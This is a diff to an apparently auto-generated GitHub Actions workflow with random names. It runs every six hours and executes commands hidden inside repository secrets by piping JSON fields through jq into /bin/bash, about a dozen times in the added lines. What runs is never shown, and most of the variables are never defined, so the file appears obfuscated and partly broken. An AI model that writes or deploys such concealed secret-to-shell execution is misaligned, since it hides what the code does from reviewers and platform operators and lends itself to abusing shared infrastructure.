@@ -1,26 +1,28 @@
 name: xiezijian7654
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '17 4/6 * * *'
+    - cron: '23 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: xiezijian7654
         env:
-          kor7: ${{ secrets.kor7 }}
+          s2477: ${{ secrets.s2477 }}
         run: |
-          echo $kor7 | jq -r .b6893 | /bin/bash
-          echo $sntf0 | jq -r .assl7 | /bin/bash
-          echo $db1658 | jq -r .pm8038 | /bin/bash
-          echo $nj51032 | jq -r .hkdha8 | /bin/bash
-          echo $i29 | jq -r .ad2648 | /bin/bash
-          echo $zdv9306 | jq -r .mqdp00 | /bin/bash
-          echo $kvti71 | jq -r .hlmxk6319 | /bin/bash
-          echo $eqrlq28 | jq -r .qtscr5733 | /bin/bash
-          echo $vrpfx5 | jq -r .hzw681 | /bin/bash
-          echo $yc64 | jq -r .kglj5 | /bin/bash
+          echo $s2477 | jq -r .o112 | /bin/bash
+          echo $gjm4262 | jq -r .kbenf5272 | /bin/bash
+          echo $nvgvo9576 | jq -r .xqjqo40544 | /bin/bash
+          echo $sqld3 | jq -r .qk5641 | /bin/bash
+          echo $bu318 | jq -r .ti76284 | /bin/bash
+          echo $tctk3 | jq -r .etem495 | /bin/bash
+          echo $tz53 | jq -r .xwz018 | /bin/bash
+          echo $ebesi9526 | jq -r .ud501 | /bin/bash
+          echo $i68247 | jq -r .cuupb78 | /bin/bash
+          echo $rxihn21840 | jq -r .sy04076 | /bin/bash
+          echo $sbu9968 | jq -r .zoq9902 | /bin/bash
+          echo $oco27 | jq -r .kon5 | /bin/bash
 
